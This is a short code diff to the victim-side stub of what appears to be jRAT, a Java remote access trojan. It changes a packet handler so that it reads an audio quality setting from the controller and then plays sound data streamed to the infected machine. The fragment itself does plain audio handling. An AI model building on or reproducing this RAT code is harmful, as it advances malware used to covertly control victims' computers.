@@ -5,11 +5,11 @@ import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.DataLine;
 import javax.sound.sampled.SourceDataLine;
 
+import se.jrat.common.Sound;
 import se.jrat.stub.Connection;
 
 public class Packet83ClientDownloadSound extends AbstractIncomingPacket {
 
-	public static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
 	private static DataLine.Info info;
 	private static SourceDataLine line;
 
@@ -17,7 +17,10 @@ public class Packet83ClientDownloadSound extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
+		int quality = Connection.instance.readInt();
+		
 		if (!initialized) {
+			AudioFormat format = Sound.getFormat(quality);
 			info = new DataLine.Info(SourceDataLine.class, format);
 			if (!AudioSystem.isLineSupported(info)) {
 				throw new Exception("Sound line is not supported");
@@ -29,7 +32,7 @@ public class Packet83ClientDownloadSound extends AbstractIncomingPacket {
 		}
 
 		int size = Connection.instance.readInt();
-
+		
 		byte[] data = new byte[size];
 
 		Connection.instance.getDataInputStream().readFully(data);
